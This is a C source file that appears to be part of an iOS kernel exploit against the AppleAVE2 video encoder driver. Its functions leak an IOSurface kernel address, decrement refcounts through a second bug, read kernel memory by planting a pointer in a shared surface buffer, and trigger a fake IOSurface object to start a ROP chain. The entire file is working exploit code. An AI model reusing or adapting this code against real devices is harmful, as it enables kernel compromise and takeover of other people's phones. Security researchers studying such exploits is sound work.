#include "apple_ave_pwn.h"
#include "log.h"
#include "iosurface_utils.h"
#include "apple_ave_utils.h"
#include "offsets.h"

static io_connect_t g_surface_conn = 0;
static io_connect_t g_apple_ave_conn = 0;

/* Due to ref leak bugs in AppleAVE2, this surface will, unfortunately, never be freed */
static void * g_bad_surface_that_will_never_be_freed_kernel_ptr = NULL;
static uint32_t g_bad_surface_that_will_never_be_freed = 0;
static void * g_bad_surface_buffer = NULL;
static size_t g_bad_surface_buffer_size = 0;

/*
 * Function name: 	apple_ave_pwn_get_bad_surface_kernel_ptr
 * Description:		Gets the kernel pointer of our g_bad_surface_that_will_never_be_freed.
 * Returns:			void *.
 */

void * apple_ave_pwn_get_bad_surface_kernel_ptr() {
	
	return g_bad_surface_that_will_never_be_freed_kernel_ptr;
}

/*
 * Function name: 	apple_ave_pwn_drop_surface_refcount
 * Description:		Drops the refcount of the IOSurface object.
 * Returns:			kern_return_t.
 */

kern_return_t apple_ave_pwn_drop_surface_refcount(void * surface_kernel_address) {
	
	kern_return_t ret = KERN_SUCCESS;
	io_connect_t apple_ave_conn_for_drop_refcount = 0;
	char input_buffer[ENCODE_FRAME_INPUT_BUFFER_SIZE] = {0};
	char output_buffer[ENCODE_FRAME_OUTPUT_BUFFER_SIZE] = {0};
	
	ret = apple_ave_utils_get_connection(&apple_ave_conn_for_drop_refcount);
	if (KERN_SUCCESS != ret)
	{
		ERROR_LOG("Error initiating a connection to the AppleAVE driver");
		goto cleanup;
	}

	ret = apple_ave_utils_add_client(apple_ave_conn_for_drop_refcount);
	if (KERN_SUCCESS != ret)
	{
		ERROR_LOG("Error adding AppleAVE2 client");
		goto cleanup;
	}

	//*(unsigned int*)input_buffer = 0xDEADBEEF;
	*(unsigned int*)(input_buffer + 0x4) = g_bad_surface_that_will_never_be_freed;
	*(unsigned int*)(input_buffer + 0x8) = g_bad_surface_that_will_never_be_freed;
	*(unsigned int*)(input_buffer + 0xC) = g_bad_surface_that_will_never_be_freed;
	*(unsigned int*)(input_buffer + 0xD4) = g_bad_surface_that_will_never_be_freed;
	*(unsigned int*)(input_buffer + 0xD8) = g_bad_surface_that_will_never_be_freed;
	*(unsigned int*)(input_buffer + 0xE8) = g_bad_surface_that_will_never_be_freed;
	*(unsigned int*)(input_buffer + 0xEC) = g_bad_surface_that_will_never_be_freed;
	input_buffer[0xFC] = 1;
	input_buffer[0x2F4] = 1;

	/* the surface kernel address to drop */
	*(void**)(input_buffer + 0x100) = surface_kernel_address;

	/* this will fail the call, after the surface kernel address is already "attached" */
	*(unsigned int*)((char*)g_bad_surface_buffer + OFFSET(encode_frame_offset_info_type)) = 0xffff;

	*((char*)g_bad_surface_buffer + OFFSET(encode_frame_offset_chroma_format_idc)) = 1;
	*(unsigned int*)((char*)g_bad_surface_buffer + OFFSET(encode_frame_offset_ui32_width)) = 0xC0;
	*(unsigned int*)((char*)g_bad_surface_buffer + OFFSET(encode_frame_offset_ui32_height)) = 0xC0;
	*(unsigned int*)((char*)g_bad_surface_buffer + OFFSET(encode_frame_offset_slice_per_frame)) = 0x1;

	ret = apple_ave_utils_prepare_to_encode_frames(apple_ave_conn_for_drop_refcount, input_buffer, output_buffer);
	if (kIOReturnError != ret)
	{
		ERROR_LOG("Error preparing to encode frames...");
		goto cleanup;
	}

	ret = KERN_SUCCESS;


cleanup:

	if (apple_ave_conn_for_drop_refcount)
	{
		apple_ave_utils_remove_client(apple_ave_conn_for_drop_refcount);
		IOServiceClose(apple_ave_conn_for_drop_refcount);
	}

	return ret;
}



/*
 * Function name: 	apple_ave_pwn_get_surface_kernel_address
 * Description:		Returns the kernel address of the IOSurface object.
 					The surface ID might be not be freed later on, due to ref leak bugs!
 * Returns:			kern_return_t and surface kernel address in output params.
 */

kern_return_t apple_ave_pwn_get_surface_kernel_address(uint32_t surface_id, void ** surface_kernel_address) {
	
	kern_return_t ret = KERN_SUCCESS;
	char input_buffer[ENCODE_FRAME_INPUT_BUFFER_SIZE] = {0};
	char output_buffer[ENCODE_FRAME_OUTPUT_BUFFER_SIZE] = {0};

	//*(unsigned int*)input_buffer = 0xDEADBEEF;
	*(unsigned int*)(input_buffer + 0x4) = g_bad_surface_that_will_never_be_freed;
	*(unsigned int*)(input_buffer + 0x8) = g_bad_surface_that_will_never_be_freed;
	*(unsigned int*)(input_buffer + 0xC) = surface_id;
	*(unsigned int*)(input_buffer + 0xD4) = g_bad_surface_that_will_never_be_freed;
	*(unsigned int*)(input_buffer + 0xD8) = g_bad_surface_that_will_never_be_freed;
	*(unsigned int*)(input_buffer + 0xE8) = g_bad_surface_that_will_never_be_freed;
	*(unsigned int*)(input_buffer + 0xEC) = g_bad_surface_that_will_never_be_freed;
	input_buffer[0xFC] = 1;
	input_buffer[0x2F4] = 1;

	*(unsigned int*)((char*)g_bad_surface_buffer + OFFSET(encode_frame_offset_info_type)) = 0x4567;

	*((char*)g_bad_surface_buffer + OFFSET(encode_frame_offset_chroma_format_idc)) = 1;
	*(unsigned int*)((char*)g_bad_surface_buffer + OFFSET(encode_frame_offset_ui32_width)) = 0xC0;
	*(unsigned int*)((char*)g_bad_surface_buffer + OFFSET(encode_frame_offset_ui32_height)) = 0xC0;
	*(unsigned int*)((char*)g_bad_surface_buffer + OFFSET(encode_frame_offset_slice_per_frame)) = 0x1;

	ret = apple_ave_utils_prepare_to_encode_frames(g_apple_ave_conn, input_buffer, output_buffer);
	if (KERN_SUCCESS != ret)
	{
		ERROR_LOG("Error preparing to encode frames...");
		goto cleanup;
	}

	*surface_kernel_address = *(void**)output_buffer;

	/* Leaking the address also leaks a refcount. So we drop it manually (using, you guessed, another vulnerability). */
	apple_ave_pwn_drop_surface_refcount(*surface_kernel_address);

cleanup:
	return ret;
}


/*
 * Function name: 	apple_ave_pwn_put_data_in_bulk
 * Description:		Exploits another vulnerability to read from an address, dereference it, 
 					and then put the value back.
 * Returns:			kern_return_t.
 */

kern_return_t apple_ave_pwn_put_data_in_bulk(void * address_with_data) {
	
	kern_return_t ret = KERN_SUCCESS;
	char input_buffer[ENCODE_FRAME_INPUT_BUFFER_SIZE] = {0};
	char output_buffer[ENCODE_FRAME_OUTPUT_BUFFER_SIZE] = {0};

	bzero(input_buffer, ENCODE_FRAME_INPUT_BUFFER_SIZE);
	bzero(output_buffer, ENCODE_FRAME_OUTPUT_BUFFER_SIZE);


	//*(unsigned int*)input_buffer = 0xDEADBEEF;
	*(unsigned int*)(input_buffer) = g_bad_surface_that_will_never_be_freed;
	*(unsigned int*)(input_buffer + 4) = g_bad_surface_that_will_never_be_freed;
	*(unsigned int*)(input_buffer + 8) = g_bad_surface_that_will_never_be_freed;
	*(unsigned int*)(input_buffer + 0xC) = g_bad_surface_that_will_never_be_freed;
	*(unsigned int*)(input_buffer + 0xD4) = g_bad_surface_that_will_never_be_freed;
	*(unsigned int*)(input_buffer + 0xD8) = g_bad_surface_that_will_never_be_freed;
	*(unsigned int*)(input_buffer + 0xE8) = g_bad_surface_that_will_never_be_freed;
	*(unsigned int*)(input_buffer + 0xEC) = g_bad_surface_that_will_never_be_freed;

	*(unsigned int*)((char*)g_bad_surface_buffer + 4) = 0xC00CBABE;

	*(unsigned int*)((char*)g_bad_surface_buffer + offsets_get_offsets().encode_frame_offset_info_type) = 0x4569;

	*(void**)((char*)g_bad_surface_buffer + offsets_get_offsets().encode_frame_offset_iosurface_buffer_mgr) = address_with_data;
	*((char*)g_bad_surface_buffer + offsets_get_offsets().encode_frame_offset_keep_cache) = 0;
	//*(unsigned int*)((char*)g_bad_surface_buffer + 0xC) = 5;

	ret = apple_ave_utils_encode_frame(g_apple_ave_conn, input_buffer, output_buffer);
	if (KERN_SUCCESS != ret)
	{
		//ERROR_LOG("Error preparing to encode frames...");
		goto cleanup;
	}


cleanup:
	*(void**)((char*)g_bad_surface_buffer + offsets_get_offsets().encode_frame_offset_iosurface_buffer_mgr) = NULL;
	return ret;
}



/*
 * Function name: 	apple_ave_pwn_init
 * Description:		Initializes connections and stuff for exploitation with the AppleAVE2 driver.
 * Returns:			kern_return_t.
 */

kern_return_t apple_ave_pwn_init() {
	
	kern_return_t ret = KERN_SUCCESS;
	char surface_data[IOSURFACE_DICTIONARY_SIZE] = {0};

	ret = apple_ave_utils_get_connection(&g_apple_ave_conn);
	if (KERN_SUCCESS != ret)
	{
		ERROR_LOG("Error initiating a connection to the AppleAVE driver");
		goto cleanup;
	}

	ret = apple_ave_utils_add_client(g_apple_ave_conn);
	if (KERN_SUCCESS != ret)
	{
		ERROR_LOG("Error adding AppleAVE2 client");
		IOServiceClose(g_apple_ave_conn);
		g_apple_ave_conn = 0;
		goto cleanup;
	}

	ret = iosurface_utils_get_connection(&g_surface_conn);
	if (KERN_SUCCESS != ret)
	{
		ERROR_LOG("Error initiating connection to IOSurfaceRoot");
		goto cleanup;
	}

	ret = iosurface_utils_create_surface(g_surface_conn, &g_bad_surface_that_will_never_be_freed, surface_data);
	if (KERN_SUCCESS != ret)
	{
		ERROR_LOG("Error creating a bad surface that will never be freed");
		goto cleanup;
	}

	g_bad_surface_buffer = *(void**)surface_data;
	g_bad_surface_buffer_size = *(uint32_t*)(surface_data+0x14);

	ret = apple_ave_pwn_get_surface_kernel_address(g_bad_surface_that_will_never_be_freed, 
		&g_bad_surface_that_will_never_be_freed_kernel_ptr);

	if (KERN_SUCCESS != ret)
	{
		ERROR_LOG("Error getting kernel pointer for surface %d", g_bad_surface_that_will_never_be_freed);
	}
	else {
		DEBUG_LOG("g_bad_surface_that_will_never_be_freed's kernel pointer is %p", g_bad_surface_that_will_never_be_freed_kernel_ptr);
	}

cleanup:
	if (KERN_SUCCESS != ret)
	{
		if (g_surface_conn)
		{
			IOServiceClose(g_surface_conn);
			g_surface_conn = 0;
		}

		if (g_apple_ave_conn)
		{
			apple_ave_utils_remove_client(g_apple_ave_conn);
			IOServiceClose(g_apple_ave_conn);
			g_apple_ave_conn = 0;
		}
	}
	return ret;
}

/*
 * Function name: 	apple_ave_pwn_cleanup
 * Description:		Cleans up the resources needed for the vulnerabilities.
 * Returns:			kern_return_t.
 */

kern_return_t apple_ave_pwn_cleanup() {
	
	kern_return_t ret = KERN_SUCCESS;

	if (g_surface_conn)
	{
		if (g_bad_surface_that_will_never_be_freed)
		{
			iosurface_utils_release_surface(g_surface_conn, g_bad_surface_that_will_never_be_freed);
			g_bad_surface_that_will_never_be_freed = 0;
		}

		IOServiceClose(g_surface_conn);
		g_surface_conn = 0;
	}

	if (g_apple_ave_conn)
	{
		apple_ave_utils_remove_client(g_apple_ave_conn);
		IOServiceClose(g_apple_ave_conn);
		g_apple_ave_conn = 0;
	}

	return ret;
}

/*
 * Function name: 	apple_ave_pwn_initialize_input_buffer_for_fake_iosurface_usage
 * Description:		Initializes the buffer so that the SetSessionSettings external method will
 					use our maliciously crafted IOSurface object.
 * Returns:			void.
 */

static
void apple_ave_pwn_initialize_input_buffer_for_fake_iosurface_usage(void * input_buffer, void * fake_iosurface_address) {

	int i = 0;

	for(i = 4; i < 0x100; i += 4) {
		*(unsigned int*)((char*)input_buffer + i) = g_bad_surface_that_will_never_be_freed;		
	}

	*(void**)((char*)input_buffer + 0x100) = fake_iosurface_address;
	*(void**)((char*)input_buffer + 0x108) = fake_iosurface_address;
}



/*
 * Function name: 	apple_ave_pwn_use_fake_iosurface
 * Description:		Uses the fake IOSurface to start the ROP chain.
 * Returns:			kern_return_t.
 */

kern_return_t apple_ave_pwn_use_fake_iosurface(void * fake_iosurface_address) {
	
	kern_return_t ret = KERN_SUCCESS;
	io_connect_t apple_ave_rop_conn = 0;
	char input_buffer[ENCODE_FRAME_INPUT_BUFFER_SIZE] = {0};
	char output_buffer[ENCODE_FRAME_OUTPUT_BUFFER_SIZE] = {0};

	*((char*)g_bad_surface_buffer + OFFSET(encode_frame_offset_chroma_format_idc)) = 1;
	*(unsigned int*)((char*)g_bad_surface_buffer + OFFSET(encode_frame_offset_ui32_width)) = 0xC0;
	*(unsigned int*)((char*)g_bad_surface_buffer + OFFSET(encode_frame_offset_ui32_height)) = 0xC0;
	*(unsigned int*)((char*)g_bad_surface_buffer + OFFSET(encode_frame_offset_slice_per_frame)) = 0x1;

	apple_ave_pwn_initialize_input_buffer_for_fake_iosurface_usage(input_buffer, fake_iosurface_address);

	ret = apple_ave_utils_get_connection(&apple_ave_rop_conn);
	if (KERN_SUCCESS != ret)
	{
		ERROR_LOG("Error establishing a connection to AppleAVE");
		goto cleanup;
	}

	ret = apple_ave_utils_add_client(apple_ave_rop_conn);
	if (KERN_SUCCESS != ret)
	{
		ERROR_LOG("Error adding AppleAVE client");
		IOServiceClose(apple_ave_rop_conn);
		apple_ave_rop_conn = 0;
		goto cleanup;
	}

	ret = apple_ave_utils_set_session_settings(apple_ave_rop_conn, input_buffer, output_buffer);
	if (KERN_SUCCESS != ret)
	{
		ERROR_LOG("Error setting session settings");
		goto cleanup;
	}

cleanup:

	if (apple_ave_rop_conn)
	{
		apple_ave_utils_remove_client(apple_ave_rop_conn);
		IOServiceClose(apple_ave_rop_conn);
		apple_ave_rop_conn = 0;
	}

	return ret;
}



